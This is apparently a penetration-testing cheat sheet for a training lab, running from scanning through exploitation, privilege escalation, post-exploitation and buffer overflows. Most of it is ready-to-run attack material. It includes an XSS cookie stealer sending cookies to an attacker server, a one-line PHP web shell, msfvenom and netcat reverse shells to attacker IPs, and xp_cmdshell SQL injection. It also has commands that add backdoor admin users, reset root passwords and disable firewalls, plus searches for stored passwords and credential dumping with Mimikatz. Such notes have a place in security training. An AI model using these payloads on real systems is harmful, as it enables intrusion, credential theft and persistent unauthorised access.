# Strategy
## Information Gathering

Run an nmap scan on the target:

```nmap -sU -sT -p- -A -PN -T4 -oN nmap.txt 10.11.1.21```

Tunnel nmap through an ssh proxy
```
ssh sean@10.11.1.251 -D 9005 -N -f
proxychains nmap -sT -T4 -oN itDNS.txt 10.1.1.236
```

Check nmap scripts (https://nmap.org/nsedoc/)

```
ls /usr/share/nmap/scripts/

nmap -v -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 10.11.1.21
nmap -v -p 139,445 --script=smb-enum-* 10.11.1.21

```

Upgrade shell to tty

```
python -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
```

## Exploitation

### Web Applications

- Use nikto or dirb to find pages and apps
- google framework to find out admin console url
- Check Default credentials

gobuster
```
gobuster -u http://10.1.1.1 -w /usr/share/wordlists/dirb/big.txt
```

wordpress
```
wpscan
```

LFI
```
index.php?page=../../../../../etc/passwd%00
```

SQLi

MSSQL
```
a'; EXEC master..xp_cmdshell 'net user'; --

-- To allow advanced options to be changed.
EXEC sp_configure 'show advanced options', 1
GO
-- To update the currently configured value for advanced options.
RECONFIGURE
GO
-- To enable the feature.
EXEC sp_configure 'xp_cmdshell', 1
GO
-- To update the currently configured value for this feature.
RECONFIGURE
GO
```

cookie stealer script
```
<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>
```

shells
php backdoor
```
echo '<?php system(“rshell.exe”); ?>' > backdoor.php
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.11.0.95 lport=9000 -f exe -o rshell.exe
```
even tinier backdoor (backticks work the same as `shell_exec`)
```
<?=`$_GET[1]`?>
```

[Dictionary Attacks on login forms](https://blog.techorganic.com/2014/07/15/hell-hacking-challenge/)

nc "invalid option -e"
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.171 9000 >/tmp/f
```


### SMB

connect to share
```
smbclient \\\\10.11.1.31\\<share name>
```

mount smb share in kali
```
mount -t cifs //10.11.1.31/<share name> /path/to/local/folder -o username=guest,password=,vers=1.0
```

[Windows server Remote Code Execution (MS08-067)](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py)

[Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)](https://www.exploit-db.com/exploits/40280)

[Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10)


### Weak Passwords

SSH, RDP, FTP, Telnet, HTTP(S), POP3(S), IMAP, SMB, VNC, SIP, Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA
```
ncrack
```

see also hydra, medusa


### Troubleshooting

Shellcode isn't working
- Make sure you're using payload `linux/x86/shell_reverse_tcp` not `linux/x86/shell/reverse_tcp`. The latter is a staged payload that requires the multi/handler
- Check for bad characters and include them in msfvenom with `-b '\x00\xff'` 

## Privilege Escalation

transfer files with nc
```
nc -nlvp 4444 > incoming.exe
nc -nv 10.0.0.22 4444 < outgoing.exe
```

### Linux

linux kernel vulnerabilities
```
uname -a
cat /etc/lsb-release
```

[Dirtycow Kernel 2.6.22 < 3.9](https://www.exploit-db.com/exploits/40616)
[Linux Kernel 2.6 udev < 1.4.1 Local Privilege Escalation](https://www.exploit-db.com/exploits/8478)
[Linux Kernel 2.6.39 < 3.2.2 (x86/x64) - 'Mempodipper'](https://www.exploit-db.com/exploits/35161)


Finding writable files

```
find / -writable 2>/dev/null
```

### Windows

info gathering 
```
systeminfo
driverquery
tasklist
fsutil fsinfo drives
set
qwinsta
net time
net file
net session
net use

netstat -bano

driverquery | findstr Kernel

wevtutil el

schtasks /query /fo LIST /v

```


uploading files

- SMB server
```
smbserver.py SOMETHING /root/shells
---
copy \\10.11.0.171\SOMETHING\exploit.exe .

```
- FTP
- TFTP

Windows kernel exploits

[Potato Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012](https://github.com/foxglovesec/Potato)

[Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)](https://www.exploit-db.com/exploits/40564)



## Post Exploitation

### Linux
Add ssh key to authorized_keys in root home

Add a new sudo user
```
useradd -m -p wlIrasyzP7iwI sloth
usermod -aG sudo sloth
```

Change a user's password
```
echo "password123" | passwd --stdin root
echo -e "DrP3pp3r\nDrP3pp3r" | passwd --stdin root
```

Capture packets
```
tcpdump -i eth0 -s 65535 -w dump.pcap host 10.11.1.218
```


### Windows

add a user
```
net user sloth password123 /add
net localgroup administrators sloth /add

```

disable firewall
```
netsh advfirewall set  allprofiles state off

netsh firewall set opmode mode=DISABLE
```

enable rdesktop
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
---
rdesktop -u sloth -p password123 -g 90% 10.11.1.22

```

Manual info gathering
```
type %SYSTEMDRIVE%\boot.ini
type %WINDIR%\win.ini
type %WINDIR%\System32\drivers\etc\hosts

dir /s *pass* == *key* == *vnc* == *.config*
findstr /si pass *.xml *.ini *.txt

reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s

```

capture packets on windows
```
WinDump.exe -i 2 -s 65535 -w dump.pcap host 10.11.1.218
```
Then use [Message Analyzer](http://www.microsoft.com/en-us/download/details.aspx?id=44226)


Unhide all hidden files and folders
```
attrib -s -h -r /s /d *.*
```

[Mimikatz](https://github.com/gentilkiwi/mimikatz)

Windows Credential Editor
```
wce.exe
```

Password cracking

```
john -wordlist:/usr/share/wordlists/10-million-password-list-top-100000.txt --format=phpass hash.txt
```

Password protected zips

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt password_protected.zip
```

## Stuck? Don't Panic!

- Try super obvious username/password combinations (use cewl if necessary)
- Google the name of the service, look for known vulns, default passwords
- Revert, Revert, Revert
- Re-try the thing that seemed like it should have worked but didn't. Start over. You may have made a typo somewhere.
- Look at services found by nmap. Check for nmap scripts to enumerate them further.
- Go through enumeration line-by-line. Compare to a normal system.
- Try more exploits. If the system might be vulnerable to a bunch, try them all.


## Buffer overflow
Find EIP offset
```
msf-pattern_create -l 2700
msf-pattern_offset -q 39694438 -l 2700
```

Make room for shellcode

Identify bad characters
```
badchars = '\x00\x0A\x0D'
shellcode = ''.join([chr(x) if chr(x) not in badchars else 'A' for x in range(0,255)])
```

badchars.py
```
import sys


def getChars(filename):
    result = ""
    with open(filename, 'r') as f:
        lines = f.readlines()
        return ''.join([l.strip().decode('hex')[::-1] for l in lines])

if __name__=="__main__":
    filename = sys.argv[1]
    chars = getChars(filename)
    allchars = ''.join([chr(x) for x in range(0,255)])
    for i in range(0, len(chars)):
        if chars[i] != allchars[i]:
            print("Found difference %02x : %02x" %(ord(allchars[i]), ord(chars[i])))
    print(chars)
```

Find an instruction that will execute our shellcode
```
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
```

Find an occurance of that in the executable
```
!mona modules
!mona find -s "\xff\xe4" -m slmfc.dll
```

Generate shellcode
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.171 LPORT=9000 EXITFUNC=thread -b "\x00\x0A\x0D" -f python
```

### Troubleshooting
Don't forget to put some nops around your shellcode just in case.

### Linux

Use edb
```
edb --run vulnerablebinary
```
